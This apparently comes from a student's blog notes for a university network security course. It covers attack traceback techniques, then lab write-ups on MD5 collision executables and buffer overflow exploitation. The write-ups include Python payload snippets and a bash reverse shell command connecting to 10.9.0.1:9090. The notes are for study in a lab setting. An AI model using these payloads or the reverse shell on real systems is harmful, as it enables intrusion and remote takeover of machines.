title="8.1.溯源概述"></a>8.1.溯源概述</h2><p>网络攻击者大都使用伪造IP地址或通过多个跳板发起攻击，使防御方很难确定真正攻击源的身份和位置，难以实施针对性防御策略。在网络攻防对抗中，只有拥有信息优势，才能更加有效地实施网络对抗策略，进而取得胜利。网络攻击追踪溯源的目标是探知攻击者身份、攻击点位置及攻击路径等信息，据此可针对性制定防护或反制措施，进而占领网络对抗制高点。</p><p>典型网络攻击场景中所涉及的角色通常包括攻击者、受害者、跳板、僵尸机及反射器等。一般来说，网络攻击追踪溯源是指确定攻击者的账号信息、身份信息、IP地址和MAC地址等虚拟地址信息与地理位置信息、攻击的中间环节信息以及还原攻击路径等的过程。</p><p>![截屏2024-12-31 14.27.52](.&#x2F;attachments&#x2F;截屏2024-12-31 14.27.52.png)</p><p>按追踪溯源深度，网络攻击追踪溯源可分为<strong>攻击主机追踪溯源、控制主机追踪溯源、攻击者追踪溯源和攻击组织追踪溯源。</strong></p><p>网络攻击追踪溯源的应用场景与攻击事件和网络应用环境相关，据追踪溯源应用的网络环境不同，可分为<strong>域内追踪溯源和跨域追踪溯源</strong>。域内追踪溯源为协作网域追踪溯源；跨域追踪溯源为非协作网域追踪溯源</p><h2 id="8-2-追踪溯源面临的挑战"><a href="#8-2-追踪溯源面临的挑战" class="headerlink" title="8.2.追踪溯源面临的挑战"></a>8.2.追踪溯源面临的挑战</h2><h3 id="8-2-1-跳板攻击"><a href="#8-2-1-跳板攻击" class="headerlink" title="8.2.1.跳板攻击"></a>8.2.1.跳板攻击</h3><p>攻击者为隐藏身份，在攻击实施前通常会渗透控制数台计算机作为跳板，再通过这些受控制的跳板攻击最终的目标主机。广义而言，反射器和僵尸机也属于跳板，只是反射器被攻击者控制的程度低，攻击者只能访问反射器，利用网络协议的漏洞进行攻击数据流的放大、地址伪造等，而僵尸机被攻击者控制的程度最高，攻击者具有管理员权限，能够在僵尸机上做想做的任何操作。此外，为隐藏身份，攻击者还经常借助匿名通信系统的天然匿名性(如发送者匿名）来开展攻击。</p><p>典型的跳板攻击方式如图所示，攻击者首先登录跳板1，通过跳板1登录跳板2，依次登录，进而建立跳板链，然后利用跳板链的末端对受害者发起攻击。</p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/image-20241231143611056.png" alt="image-20241231143611056" style="zoom: 33%;" /><p>为更好躲避检测和追踪溯源，攻击者往往还采用以下手段</p><blockquote><p>为更有效地躲避追踪，攻击者还往往在跳板处主动对其产生的交互流量进行加密、包重组(Repacketization）和添加时间扰乱（Timing Perturbation）与垃圾包(Chaff Packet）等干扰。</p></blockquote><p>（1） 在中间跳板上安装和使用后门（如netcat）以躲避登录陆日志的检查;</p><p>（2） 在跳板链中的不同部分使用不同类型(TCP和UDP)的网络连接来增加数据流关联的难度;</p><p>（3） 不同跳板间使用加密（采用不同的密钥）连接来抵御基于包内容的检测;</p><p>（4） 在跳板处引入时间扰乱来抵御基于包时间的加密数据流关联;</p><p>（5） 在跳板处主动对其交互数据流添加包重组和垃圾包等干扰。</p><h3 id="8-2-2-匿名通信系统"><a href="#8-2-2-匿名通信系统" class="headerlink" title="8.2.2.匿名通信系统"></a>8.2.2.匿名通信系统</h3><p>匿名通信系统通过一定的技术手段将网络数据流中通信双方的身份信息加以隐藏，使第三方无法获取或推测通信双方的通信关系或其中任何一方的身份信息。</p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-31 14.42.32.png" alt="截屏2024-12-31 14.42.32" style="zoom: 33%;" /><ul><li>基于消息(Message Based)的匿名通信系统，通常为每个消息都选择一条路径，这些路径可相同也可不同，如匿名电子邮件系统Chaum Mix和Mixminion等。</li><li>基于流(Flow Based）的匿名通信系统，通常在发送者和接收者之间建立匿名通信通道（即匿名路径），然后把数据放入数据传输的基本单元——信元(CelI）中沿着建立好的匿名通道传输，主要用于对延迟有特定要求的服务（如Web浏览和网络聊天等），典型系统如洋葱路由(Onion Routing）、Tor、Tarzan、MorphMix和Crowds等。</li></ul><h3 id="8-2-3-其它挑战"><a href="#8-2-3-其它挑战" class="headerlink" title="8.2.3.其它挑战"></a>8.2.3.其它挑战</h3><ul><li><p>由于当前广泛使用的TCP&#x2F;IP协议簇在其设计之初未考虑用户行为的追踪审计，且未考虑防范不可信用户，对IP数据包的源地址没有验证机制以及Internet基础设施的无状态性，攻击者能够对数据源地址字段直接进行修改或假冒，以隐藏其自身信息，使得追踪数据包的真实发起者非常困难。</p></li><li><p>个人隐私保护和法律法规不健全，阻碍网络攻击追踪溯源。随着个人信息保护意识的增强，人们对个人隐私的保护越来越重视。</p></li><li><p>网络攻击追踪溯源技术一方面可以追踪定位攻击源，另一方面也能对网络中正常的业务信息进行追踪定位。</p></li><li><p>一些新技术在为用户带来好处的同时，也给追踪溯源带来了较大障碍。</p><ul><li><p>虚拟专用网络（VPN）采用的IP隧道技术，使得无法获取数据报文的信息;</p></li><li><p>互联网服务供应商(Internet Service Provider，ISP）采用的地址池和网络地址转换(Network Address Translation，NAT)技术，使得网络IP地址不再固定对应特定的用户;</p></li><li><p>移动通信网络技术的出现更是给追踪溯源提出了实时性要求。</p></li></ul></li></ul><h2 id="8-3-追踪溯源典型技术"><a href="#8-3-追踪溯源典型技术" class="headerlink" title="8.3.追踪溯源典型技术"></a>8.3.追踪溯源典型技术</h2><p>追踪溯源技术大体可分为定位伪造地址的IP追踪技术、跳板攻击溯源技术和针对匿名通信系统的追踪溯源技术三类。</p><h3 id="8-3-1-定位伪造地址的IP追踪技术"><a href="#8-3-1-定位伪造地址的IP追踪技术" class="headerlink" title="8.3.1.定位伪造地址的IP追踪技术"></a>8.3.1.定位伪造地址的IP追踪技术</h3><p>IP追踪技术可追踪采用伪造地址的数据包的真实发送者，分为反应式追踪和主动式追踪两大类。</p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-31 14.46.18.png" alt="截屏2024-12-31 14.46.18" style="zoom: 33%;" /><p>（1） 反应式追踪</p><p>反应式追踪只能在攻击正在实施时进行追踪，典型的方法有输入调试法和受控洪泛(Controlled Flooding）法。</p><ul><li><p>输入调试法：该方法要求追踪路径上所有路由器必须具有输入调试能力，需要繁琐的手工干预,且依赖于ISP的高度合作，追踪速度相对较慢；另外输入调试法只有在攻击进行时才能追踪，不能追踪间歇性发起的攻击</p></li><li><p>受控洪泛法：在攻击发生时，首先利用已有的Internet拓扑图选择距离受害者最近的路由的每一条上游链路，并分别进行泛洪泛攻击，通过观察来自攻击者的包的变化来确定攻击数据包经过哪条链路，然后采用同样方法对上游链路继续泛洪泛，以此逐步定位攻击源。但该方法本身就是一种DoS攻击，且需要与上游主机的高度合作及Internet详细拓扑图</p></li></ul><p>（2） 主动式追踪</p><p>主动式追踪既可用于对攻击的实时阻断，又可用于对攻击的事后分析，典型方法有包标记（Packet Marking）法、路由日志（Route Logging)法、ICMP追踪法。</p><h3 id="8-3-2-跳板攻击溯源技术"><a href="#8-3-2-跳板攻击溯源技术" class="headerlink" title="8.3.2.跳板攻击溯源技术"></a>8.3.2.跳板攻击溯源技术</h3><p>网络攻击者为隐藏身份和防止源追踪的另一个常用手段是使用跳板。通过使用事先控制的一系列中间节点对目标实施攻击，致使追踪者跟踪到的是最后一个跳板，而难以追溯到攻击者本身。为更有效地躲避追踪，攻击者还往往在跳板处主动对其产生的交互流量进行加密、包重组(Repacketization）和添加时间扰乱（Timing Perturbation）与垃圾包(Chaff Packet）等干扰。为追溯和定位跳板链后的真正攻击源，按照溯源时所用信息源的不同，跳板攻击溯源技术可分为<u>基于主机的溯源方法和基于网络的溯源方法</u>。</p><p>（1） 基于主机的溯源方法</p><p>基于主机的溯源方法主要有分布式入侵检测系统（DIDS)、呼叫识别系统（CIS）、Caller ID和会话令牌协议(STOP）。其中DIDS、CIS和STOP采用的是被动式溯源技术，而Caller ID则是由美国军方开发的一种基于主机的主动式溯源技术。</p><p>（2） 基于网络的溯源方法</p><ul><li><p>基于网络的溯源方法一般依据网络连接的属性进行溯源，主要有基于偏差（Deviation）的方法、基于网络的反应式方法和流关联技术等。</p><ul><li><p>基于偏差的方法使用两个TCP连接序列号的最小平均差别来确定两个连接是否关联，偏差既考虑了时间特征又考虑了TCP序列号，与TCP负载无关，但无法直接用于加密或压缩的连接;</p></li><li><p>基于网络的反应式方法对数据包处理时是主动干预的，从而动态地控制哪些连接何时何地怎样被关联，因此需要比被动方法更少的资源，典型代表是入侵识别和隔离协议（Intruder Detection and Isolation Protocol，IDIP)。</p></li><li><p>流关联技术通过检测两条数据流是否存在关联性来进行流量分析，在跳板攻击源定位、僵尸主控机（Botmaster）溯源、匿名滥用用户关联和匿名网络电话追踪等网络安全和隐私方面有着广泛的应用，是目前学术界的研究热点。</p></li></ul></li></ul><h3 id="8-3-3-针对匿名通信系统的追踪溯源技术"><a href="#8-3-3-针对匿名通信系统的追踪溯源技术" class="headerlink" title="8.3.3.针对匿名通信系统的追踪溯源技术"></a>8.3.3.针对匿名通信系统的追踪溯源技术</h3><p>匿名通信系统（如Onion Routing、Tor、Tarzan、MorphMix和Crowds等）通过一定的技术手段将网络数据流中通信双方的身份信息加以隐藏，使第三方无法获取或推测通信双方的通信关系或其中任何一方的身份信息。针对匿名通信系统的攻击手段很多，主要可分为：协议脆弱性攻击、流量分析攻击。</p><p>（1） 协议脆弱性攻击</p><blockquote><p>协议脆弱性攻击利用匿名通信系统自身的内在脆弱性对其进行攻击，以降低其匿名度。如低资源路由攻击技术利用Tor匿名网络路径选择算法的缺陷开展攻击;</p><p>因Tor匿名网络采用高级加密标准(Advanced Encryption Standard，AES）计数器模式(Counter Mode）对信元进行加密，重放攻击在入口路由器处复制发送信元，中间和出口路由器在处理复制信元时将导致计数器中断，以此发现发送者和接收者之间的通信关系;</p><p>女巫攻击(Sybil Attack)通过向匿名网络中植入自己的节点或者控制部分网络节点，然后用这些节点提供的信息推断匿名隐藏关系;</p><p>当追踪者知道自己控制的节点在发送者的路径上时，该节点的前驱节点比其它任何节点更像是发送者，追踪者对每个可能的前驱节点进行统计就可能发现发送者，前驱攻击（Predecessor Attack），又称合谋攻击(Collusion Attack）就是基于此提出的；</p><p>在攻击者控制匿名路径上的第一个和最后一个节点时，报文标记攻击(Message Tagging Attack）通过对发送消息进行标记，在最后一个节点处进行识别辨认就可明队发送者与接收者之间的关系。</p></blockquote><p>（2） 流量分析攻击</p><blockquote><p>流量分析攻击通过分析和关联不同数据流之间的流量特征来降低匿名通信系统的匿名度，主要包括时间攻击（Timing Attack)、包计数攻击和流相关攻击（Flow Correlation Attack）等。</p><p>通过分析匿名通信系统中消息之间的时间关系以找出其对应关系，时间攻击可确定被其控制的两个节点是否在同一条匿名路径上，但该攻击方式需对整个网络的输入消息和输出消息进行时间统计，且难以应对掩饰流(Cover Traffic）策略;</p><p>包计数攻击通过观察进入匿名节点数据流的数据包数量进行攻击,但该方式假设特定时间内进出匿名节点的数据流只有一条，且难以应对包添加、包移除和包重组等干扰手段</p></blockquote><h2 id="8-4-追踪溯源技术发展趋势"><a href="#8-4-追踪溯源技术发展趋势" class="headerlink" title="8.4.追踪溯源技术发展趋势"></a>8.4.<strong>追踪溯源技术发展趋势</strong></h2><p>大尺度网络中的传播源定位技术</p><ul><li>基于网络的流行病传播动力学研究中的一个研究热点是流行病的<strong>前向问题</strong>，即了解传播过程及其与感染率、治愈率以及网络结构之间的关系。对比来看，网络攻击追踪溯源的研究则是传播的<strong>逆向问题</strong>，即通过在网络的部分节点搜集感染数据，来推导传播的源头。</li></ul><p>基于软件基因的网络攻击追踪溯源技术</p><ul><li>网络攻击追踪溯源需要对整个网络空间实施监控，且越精细越好，是一件极具挑战和非常困难的任务。为此，业界提出监控全球黑客的思路来实现对攻击行为的追踪溯源，通过收集全球黑客信息，分析其行为模式等，对全球的黑客进行“画像”。</li></ul><p>基于网络大数据的网络攻击追踪溯源技术</p><ul><li>在网络安全领域，大数据处理技术被广泛用于未知攻击行为检测等方面。</li><li>如果能够有效地识别异常，网络和安全操作人员将会有时间去获取真实的态势。</li></ul><p>多手段融合的追踪溯源技术</p><ul><li>国内网络追踪溯源技术研究以理论研究为主，而以美国和日本为代表的西方国家在网络追踪溯源方面的研究则走在世界的前列，并向实用化方向发展。</li><li>学术界针对单一追踪溯源技术的缺陷，在推动网络追踪溯源实用化的动力下，逐步采用多种手段应对网络攻击。</li><li>如基于包标记和日志的多手段融合追踪溯源技术，不是将标记和日志存储方法简单地叠加，而是合理设计规划系统中标记节点和日志节点的数量和布局等，实现经济且有效的追踪，在重构攻击路径过程中综合使用包标记和日志提供的信息，快速而准确地完成攻击源定位。</li></ul>]]></content>
      
      
      <categories>
          
          <category> SCU </category>
          
          <category> 2024-2025学年 </category>
          
          <category> 网络攻防技术 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>网络攻防技术实验总结</title>
      <link href="/blog/2025/01/16/SCU/2024-2025%E5%AD%A6%E5%B9%B4/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
      <url>/blog/2025/01/16/SCU/2024-2025%E5%AD%A6%E5%B9%B4/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="基本情况"><a href="#基本情况" class="headerlink" title="基本情况"></a>基本情况</h1><ul><li><p>从实验中选考试内容，重点关注：shellcode、缓冲区溢出、xss攻击、tcp（ip欺骗）、dns</p></li><li><p>题型：</p><ul><li>选择题（基本概念）</li><li>简答题</li><li>综合分析题（出自实验）</li></ul></li></ul><blockquote><p>注意ppt里的颜色，注意实验！</p></blockquote><h1 id="Lab2-端口扫描"><a href="#Lab2-端口扫描" class="headerlink" title="Lab2-端口扫描"></a>Lab2-端口扫描</h1><p>见理论</p><h1 id="Lab3-MD5碰撞"><a href="#Lab3-MD5碰撞" class="headerlink" title="Lab3-MD5碰撞"></a>Lab3-MD5碰撞</h1><p>md5collgen工具</p><p>由前缀生成MD5碰撞，即返回两个md5值相同的文件，但是内容不完全相同，为前缀+128字节填充（不同出现在128字节的填充部分）</p><h2 id="实验a"><a href="#实验a" class="headerlink" title="实验a"></a>实验a</h2><ul><li><p>Q1.If the length of your prefix file is not multiple of 64, what is going to happen?</p><ul><li><p>可以得出结论：如果前缀文件大小不是64bytes的倍数，那么md5collgen将会自动用 00(hex) 将其补充 至64bytes的倍数。</p><blockquote><p>前64bytes：我们指定的前缀+ 00(hex) </p><p>后128bytes：md5collgen精心构造的128bytes。</p></blockquote></li><li><p>为什么是64的倍数呢？</p><p>因为MD5将输入数据划分为64个字节的块，然后在这些块上迭代计算散列（以64字节的块为处理的单元）。</p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-31 16.36.20.png" alt="截屏2024-12-31 16.36.20" style="zoom:50%;" /></li></ul></li><li><p>Q2.Create a prefix file with exactly 64 bytes, and run the collision tool again, and see what happens.</p><ul><li><p>通过上面的分析，可以得出：如果prefix文件的大小恰巧是64bytes，那么md5collgen没必要使用 00(hex) 填充。</p><blockquote><p>测试一下，不妨将 prefix.txt 改为 abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijk ，进行验证， 这里一共 63 个字母，加上文件结束符 0A 正好 64 Byte。</p></blockquote></li></ul></li><li><p>Q3.Are the data (128 bytes) generated by md5collgen completely different for the two output files? Please identify all the bytes that are different.</p><ul><li>这128bytes并不是完全不同的，实际上只有一些细小的差别，如下图红线所示。经过多次尝试发现，这 些不同的数量和位置不固定。</li></ul></li></ul><h2 id="实验b"><a href="#实验b" class="headerlink" title="实验b"></a>实验b</h2><p>要求：生成两个MD5值相同但输出不同的两个可执行文件</p><p>先编译C语言源代码，选择一个合适的位置将二进制文件截断，截取前面一部分为prefix，往后数128bytes为suffix，保证 这128bytes处于xyz数组中间。然后使用md5collgen工具，以prefix为前缀生成两个具有相同哈希的文件out1.bin，out2.bin，并从生成 的两个文件中中截取一部分作为数组的替代，命名为P、Q。然后再依次拼接相同的suffix，生成两个可 执行二进制文件a1.out、a2.out。这样生成的a1.out、a2.out就满足要求。 </p><p>但是要注意，prefix的大小一定要是64bytes的倍数，如果不是，填充的空字符会打乱代码的结构，二进 制代码无法执行。因为0x3020 &#x3D; 12320(dec)，但是12320并不是64的倍数，所以截取的prefix应该是前 12352bytes，而suffix应该截取除了前面（12352+128）bytes之后的所有</p><h2 id="实验c"><a href="#实验c" class="headerlink" title="实验c"></a>实验c</h2><p>要求：生成两个MD5值相同但代码行为不相同的可执行文件</p><p>如果对其进行md5碰撞攻击，使得A数组的内容改变，即截取包含A数组内容的64字节的倍数的数据块，再通过 md5collgen生成两个128bytes的填充后缀实现碰撞实施替换，生成拥有相同md5-hash的两个prefix，然后选择其 中任意一个prefix，寻找改变后的A数组的内容，将改变后的A数组内容复制到B数组中（需要对suffix进 行分片组合的操作），再将修改后的suffix与两个prefix连接即可获得两个正常的程序：其中一个程序 A、B数组是相同的，另外一个则不相同，所以 strcmp 的值也会不同，进而运行的代码会不同，程序的 行为会不同。但是，两个程序的md5-hash确实相同的。</p><h2 id="回答问题"><a href="#回答问题" class="headerlink" title="回答问题"></a>回答问题</h2><p>回答问题：通过上面的实验，请解释为什么可以做到不同行为的两个可执行文件具有相同的MD5值？</p><p>答：MD5校验码的长度是128比特，数量是有限的，但是文件的长度不固定，一个MD5校验码可以映射到多个文件（存在md5碰撞现象），所以，通过适当的拼接，就可以实现两个不同行为的可执行文件的MD5校验码相等。</p><ul><li><p>不同行为：在最后生成的可执行程序中，第二个数组与源程序无关，完全来自于第一个数组，因为middle取自out1.bin；因此经过填充后，两个文件中第二个数组的与其中一个相同而与（直接由md5collgen产生的）另一个不相同，从而导致if判断产生不一样的结果，最后执行不一样的函数。</p></li><li><p>相同md5：out1.bin与out2.bin是由md5collgen产生的具有相同md5值的不同prefix文件，而两个文件后面的填充+middle+suffix完全相同，因此在迭代运算中保持着相同的md5导致最后计算结果一样。即满足如下等式，</p></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MD5(M || T) = MD5(N || T)</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>由于哈希函数的特性，产生碰撞是不可避免的，通过一些已有的工具可以快速算出能发生碰撞的两个值，并且如果将两个值加上相同的一部分，再进行哈希计算，得到的哈希值依然相同。<u>但是一个好的哈 希函数应该让寻找碰撞的计算代价尽可能的大</u>，让它在计算上满足<strong>抗碰撞性</strong>。</p><p>然而，MD5不是这样一个 合格的哈希函数。</p><p>对于MD5哈希函数，使用特定程序能够轻易的找出两个不同输入。那么我们可以通过 修改程序的的变量值，但是不影响程序的结构，构造出达到相同哈希但结果不同的程序，也可以构造出 巧妙的函数结构（如实验c中），当然也可以选择构造其他的结构，以达到相同哈希但程序行为不同的效 果，通过这种方法我们可以绕过哈希检查。</p><h1 id="Lab4-缓冲区溢出攻击"><a href="#Lab4-缓冲区溢出攻击" class="headerlink" title="Lab4-缓冲区溢出攻击"></a>Lab4-缓冲区溢出攻击</h1><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2025-01-01 16.02.29.png" alt="截屏2025-01-01 16.02.29" style="zoom:50%;" /><h2 id="Task-1-Get-Familiar-with-the-Shellcode"><a href="#Task-1-Get-Familiar-with-the-Shellcode" class="headerlink" title="Task 1: Get Familiar with the Shellcode"></a>Task 1: Get Familiar with the Shellcode</h2><p><strong>call_shellcode.c中的关键代码为: <code>int(*func)()=(int(*)())code</code>;</strong></p><ul><li><code>(int(*)())</code>: 是一个类型转换，它告诉编译器将后面的值转换成一个特定的函数指针类型。具体来说，<code>int(*)() </code>表示一个没有参数并且返回 int 类型的函数。</li><li><code>(int(*)())code</code>: 这里将 code 数组强制类型转换为一个函数指针。</li><li><code>int(*func)()</code>: 这是一个函数指针的声明。func 是一个指针，指向一个返回 int 类型且不接受任何参数的函数。</li><li><code>int(*func)()=(int(*)())code;</code>: 将 code 数组转换为函数指针并赋值给 func。这意味着 func 现在指向 code 数组的首地址，并且可以像调用普通函数一样调用它。</li></ul><p>将shellcode的字节形式读入缓存区code中，定义一个函数指针指向了这片内存缓存区，即将这片缓存区的内容当作函数去执行，达到了执行shellcode的目的。</p><h2 id="Task-2-Level-1-Attacks"><a href="#Task-2-Level-1-Attacks" class="headerlink" title="Task 2: Level-1 Attacks"></a>Task 2: Level-1 Attacks</h2><p>程序结构示意图大致如下所示，我们在整个517字节的buf最后一部分放入shellcode，在函数栈帧的返 回地址处放入shellcode的地址，这里只要超过返回地址区即可，因为我们填充了**<u>NOP</u>**指令，程序会不断 向上执行空转，直到执行到shellcode。NOP指令的填充增加了攻击的成功率，</p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2025-01-01 16.33.59.png" alt="截屏2025-01-01 16.33.59" style="zoom:50%;" /><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2025-01-01 16.49.45.png" alt="截屏2025-01-01 16.49.45" style="zoom:50%;" /><p>ret的值只要是shellcode和RET之间的任意一个NOP指令即可，所以ret的值应该为&amp;bof加上一个值，这 个值的最小值为8(4*2)，也就是说，一定要跨越EBP和RET。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Decide the return address value </span></span><br><span class="line"><span class="comment"># and put it somewhere in the payload</span></span><br><span class="line">ret    = <span class="number">0xffffd7c8</span> + <span class="number">8</span>   <span class="comment"># Change this number </span></span><br><span class="line">offset = <span class="number">0xffffd7c8</span> - <span class="number">0xffffd758</span> + <span class="number">4</span>              <span class="comment"># Change this number </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Use 4 for 32-bit address and 8 for 64-bit address</span></span><br><span class="line">content[offset:offset + <span class="number">4</span>] = (ret).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>) </span><br></pre></td></tr></table></figure><h3 id="Task2-2-反向shell"><a href="#Task2-2-反向shell" class="headerlink" title="Task2.2. 反向shell"></a>Task2.2. 反向shell</h3><p>接下来修改 shellcode 在服务器上执行一个反弹 shell，相应的命令为</p><p><code>/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1</code></p><ul><li>命令中，<code>-i</code> 参数表示启动一个交互式 bash。</li><li><code>&gt;/dev/tcp/x.x.x.x.x/xxxx</code> 表示将输出发送到远程地址 x.x.x.x.x 的 xxxx 端口；</li><li>0,1,2 是特殊的文件描述符，分别表示：<ul><li>0: stdin，标准输入</li><li>1: stdout，标准输出</li><li>2: stderr，标准错误输出<ul><li><code>0&lt;&amp;1</code>, 0 表示标准输入 stdin, 1 表示标准输出 stdout, 即将 stdout 重定向到 stdin, 由于服务器的 stdout 重定向到了 tcp 连接，因此最终效果是将 tcp 连接中攻击者的输入定向到 stdin</li><li><code>2&gt;&amp;1</code>, 2 表示标准错误输出 stderr</li></ul></li></ul></li></ul><blockquote><p>ChatGPT：</p><ul><li><code>/bin/bash -i</code>：<ul><li>启动一个交互式的 bash shell。</li></ul></li><li><code>&gt; /dev/tcp/10.9.0.1/9090</code>：<ul><li>将标准输出 (<code>stdout</code>) 重定向到 <code>/dev/tcp/10.9.0.1/9090</code>。</li><li><code>/dev/tcp</code> 是 Linux 的一个伪设备，用于直接与指定的 IP 地址和端口通信。在这里，它试图与 IP 地址 <code>10.9.0.1</code> 的 <code>9090</code> 端口建立连接。</li></ul></li><li><code>0&lt;&amp;1</code>：<ul><li>将标准输入 (<code>stdin</code>) 连接到标准输出 (<code>stdout</code>)，从而允许通过网络接收命令输入。</li></ul></li><li><code>2&gt;&amp;1</code>：<ul><li>将标准错误 (<code>stderr</code>) 重定向到标准输出 (<code>stdout</code>)。</li></ul></li></ul><p>总结</p><ul><li>这个命令的效果是创建一个反向 shell：<ol><li>尝试与 <code>10.9.0.1:9090</code> 建立 TCP 连接。</li><li>一旦连接成功，bash shell 的输入和输出都会通过这个网络连接进行传输。</li><li>控制方（<code>10.9.0.1</code> 的机器）可以通过监听 <code>9090</code> 端口直接发送命令给这个 bash shell，从而远程控制目标机器。</li></ol></li></ul></blockquote><blockquote><ul><li><code>&quot;/bin/bash -i&quot;</code>: 选项 <code>-i</code> 代表交互式，意味着 shell 必须是交互式的（必须提供 shell 提示符）。</li><li><code>&quot;&gt;/dev/tcp/10.0.2.6/9090&quot;</code>: 这会导致 shell 的输出设备（stdout）被重定向到 10.0.2.6 的 9090 端口的 TCP 连接。在 Unix 系统中，stdout 的文件描述符是 1。</li><li><code>0&lt;&amp;1&quot;</code>: 文件描述符 0 代表标准输入设备（stdin）。这个选项告诉系统使用标准输出设备作为标准输入设备。由于 stdout 已经被重定向到 TCP 连接，这个选项基本上表明 shell 程序将从同一个 TCP 连接获取输入。</li><li><code>2&gt;&amp;1</code>: 文件描述符 2 代表标准错误输出 stderr。这会导致错误输出被重定向到 stdout，即 TCP 连接。</li></ul></blockquote><p>总的来看，这条命令通过 <code>-i</code> 参数启动了一个交互式 shell，并将输出结果重定向到一个 tcp 连接中，同时将标准输出流的输出作为标准输入流（shell）的输入，而标准输出流已经重定向到 tcp 连接，即 shell 从 tcp 连接中获取输入，同样将结果输出到 tcp 连接中。</p><h2 id="Task-3-Level-2-Attack"><a href="#Task-3-Level-2-Attack" class="headerlink" title="Task 3: Level-2 Attack"></a>Task 3: Level-2 Attack</h2><p>此时 docker 终端只显示了 buffer 的地址，没有显示 EBP 的值，但由实验指导的提示，已知 buffer 的 大小限定在 [100, 300] 区间内，所以可以将 100 到 308 内的每四字节都替换为返回地址 ret，</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">start = <span class="number">517</span>-<span class="built_in">len</span>(shellcode)             <span class="comment"># Change this number </span></span><br><span class="line">content[start:start + <span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decide the return address value </span></span><br><span class="line"><span class="comment"># and put it somewhere in the payload</span></span><br><span class="line">ret    = <span class="number">0xffb288e8</span> + <span class="number">308</span>   <span class="comment"># Change this number </span></span><br><span class="line"><span class="comment"># offset = 0xffffd7c8 - 0xffffd758 + 4              # Change this number </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> offset <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">104</span>,<span class="number">305</span>,<span class="number">4</span>):</span><br><span class="line">   <span class="comment"># Use 4 for 32-bit address and 8 for 64-bit address</span></span><br><span class="line">   content[offset:offset + <span class="number">4</span>] = (ret).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>) </span><br></pre></td></tr></table></figure><h2 id="Task-4-Level-3-Attack"><a href="#Task-4-Level-3-Attack" class="headerlink" title="Task 4: Level-3 Attack"></a>Task 4: Level-3 Attack</h2><p>可以看到，10.9.0.7 上运行的是 64 位的程序。根据实验手册中的描述，64 位程序的处理难点在于如何覆盖 64 位返回地址。 64 位程序的实际可用地址为 0x0 至 0x00007FFFFFFFFFFF ，前两字节固定为 \x00 ，而 strcpy() 函数在复制时遇到 \x00 则会停止，所以 ret 应使用小端位序，将 \x00 字节放在 后面</p><blockquote><p>ps1. Task4的难点在于64位计算机中的地址范围为 0x00 ~ 0x00007FFFFFFFFFFF ，因此所有地址最高位的两个字节都是 0x00 。而<strong>strcpy函数</strong><u>遇到0会停止</u>，如果和前面的方法一样，则shellcode不会被copy到缓冲区。因此解决办法是把shellcode移到badfile的前面部分，ret的值指向前面部 分。由于是小端存储，在截止前ret的非零部分已经被copy到了缓冲区。</p><p>ps2. <u>strcpy()函数虽然不会检查要复制字符串的长度，但是遇到\0会停止复制，而内存地址中的0在转字节码后也会使strcpy()函数停止复制，发生截断</u>，所以只能将构造的返回地址放在整个构造的buf的 最后面，那么shellcode部分就放在buf的最前面</p></blockquote><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2025-01-01 17.09.15.png" alt="截屏2025-01-01 17.09.15" style="zoom:50%;" /><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2025-01-01 17.12.21.png" alt="截屏2025-01-01 17.12.21" style="zoom:50%;" /><h2 id="Task-5-Level-4-Attack"><a href="#Task-5-Level-4-Attack" class="headerlink" title="Task 5: Level-4 Attack"></a>Task 5: Level-4 Attack</h2><p>发现了 rbp 与 buffer 之间的距离只有96bytes，server-4的buffer数组太小，不能使用Task4的方法，不能将shellcode放在&amp;buffer和&amp;bof之间了。</p><p><strong>分析</strong>：但是shellcode是在main函数中，作为参数传给bof函数，所以shellcode在main函数的代码段中仍然存在，可以使得bof函数结束后直接跳转到main函数中的shellcode地址。</p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2025-01-01 17.20.40.png" alt="截屏2025-01-01 17.20.40" style="zoom:50%;" /><p>修改 start，ret，offset和content，</p><ul><li>将shellcode放在高位。</li><li>offset&#x3D;rbp-buffer+8;</li><li>ret：取一个较大值，在 1184到1424之间（怎么得到的不重要，见下面的引用）。由于\x00 截断了strcpy函数，因此需要触发的shellcode并没有被拷贝到缓冲区，因此ret指向的位置需是主函数中str数组中shellcode的位置。<blockquote><ul><li><u><strong>调试L4级别的stack.c，可以获取到str数组的地址，我们需要跳转到str数组中的ret和shellcode中间的NOP中。</strong></u></li><li>str的地址+offset+8-rbp&#x3D;1184;</li><li>str的地址+517-165-rbp&#x3D;1424；shellcode是165个字节。</li></ul></blockquote></li></ul><figure 